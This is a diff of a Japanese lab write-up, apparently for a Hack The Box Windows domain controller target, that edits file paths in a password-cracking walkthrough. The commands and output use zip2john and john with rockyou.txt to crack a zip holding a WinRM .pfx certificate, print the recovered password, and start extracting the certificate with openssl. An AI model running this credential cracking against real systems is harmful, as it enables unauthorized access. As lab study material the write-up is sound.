@@ -115,11 +115,11 @@ SMB         10.129.227.113  445    DC01             [+] File "Dev/winrm_backup.z
 ```
 zipにパスワードあり、クラック成功
 ```sh
-└─$ unzip Dev\\winrm_backup.zip 
-Archive:  Dev\winrm_backup.zip
+└─$ unzip winrm_backup.zip 
+Archive:  winrm_backup.zip
 [Dev\winrm_backup.zip] legacyy_dev_auth.pfx password:
 
-└─$ zip2john Dev\\winrm_backup.zip > zip.txt                                    
+└─$ zip2john winrm_backup.zip > zip.txt                                    
 ver 2.0 efh 5455 efh 7875 Dev\winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
 
 └─$  john --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP zip.txt 
@@ -128,7 +128,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-supremelegacy    (Dev\winrm_backup.zip/legacyy_dev_auth.pfx)     
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
 1g 0:00:00:00 DONE (2025-09-28 08:14) 4.545g/s 15769Kp/s 15769Kc/s 15769KC/s surkerior..suppamas
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
@@ -136,9 +136,9 @@ Session completed.
 zip解凍、pfxファイルを入手  
 pfxからpemファイルに変換を試みたがここでもパスワードあり
 ```sh
-└─$ unzip Dev\\winrm_backup.zip
-Archive:  Dev\winrm_backup.zip
-[Dev\winrm_backup.zip] legacyy_dev_auth.pfx password: 
+└─$ unzip winrm_backup.zip
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   inflating: legacyy_dev_auth.pfx
 
 └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
